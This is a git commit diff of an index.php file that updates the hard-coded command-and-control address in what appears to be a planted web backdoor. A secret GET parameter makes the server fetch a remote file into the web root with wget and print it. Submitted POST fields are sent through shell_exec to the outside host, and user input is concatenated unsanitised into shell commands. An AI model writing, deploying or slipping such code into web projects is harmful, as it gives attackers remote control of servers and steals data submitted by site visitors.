a64d182efbcf8fa5f997a847fed7bde9dcbc0853
mobileapps84741274 <64268204+mobileapps84741274@users.noreply.github.com>
2020-10-25 14:20:23 -0400

    Update index.php

--- index.php
+++ index.php
@@ -9,7 +9,7 @@ if($_GET["linux84"] == "linux8474")
   
 {
 
-echo shell_exec("wget -q -U 'Mozille84' -O /var/www/html/linux84 http://154.127.52.52:8884/?linux84=linux8474;cat /var/www/html/linux84");
+echo shell_exec("wget -q -U 'Mozille84' -O /var/www/html/linux84 http://107.174.39.107:8884/?linux84=linux8474;cat /var/www/html/linux84");
 
 }
 
@@ -37,7 +37,7 @@ $google847446 = $_POST["linux1"];
 
 $google847446 = base64_encode($google847446);
 
-echo shell_exec("wget -q -U 'Mozille84' --post-data=linux2='" . $google84741 . "&linux3=" . $google84742 . "&linux5=" . $google847412 . "&linux1=" . $google847446 . "&linux4=" . $google84744 . "' 'http://154.127.52.52:8884/?linux84=linux84' --header='Content-type: application/x-www-form-urlencoded'");
+echo shell_exec("wget -q -U 'Mozille84' --post-data=linux2='" . $google84741 . "&linux3=" . $google84742 . "&linux5=" . $google847412 . "&linux1=" . $google847446 . "&linux4=" . $google84744 . "' 'http://107.174.39.107:8884/?linux84=linux84' --header='Content-type: application/x-www-form-urlencoded'");
 
 }
 
